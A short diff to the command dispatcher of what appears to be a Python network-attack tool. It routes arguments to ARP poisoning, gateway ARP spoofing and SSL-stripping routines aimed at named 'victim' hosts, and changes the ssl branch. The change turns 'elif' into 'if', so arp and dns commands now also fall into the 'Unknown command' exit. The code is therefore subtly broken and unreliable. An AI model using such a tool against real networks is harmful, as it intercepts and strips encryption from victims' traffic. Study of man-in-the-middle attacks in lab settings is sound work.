@@ -71,9 +71,12 @@ def main():
         arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
     elif sys.argv[1] == "arp_gateway":
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
-    elif sys.argv[1] == "ssl":
+    if sys.argv[1] == "ssl":
+        print("MITM...")
+        #perform MITM attack using arp_poison.py
         print("SSL Stripping...")
-        ssl_strip.ssl_strip()
+        ssl_strip.ssl_strip(interfaceNAT)
+
     else:
         print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
         sys.exit(1)
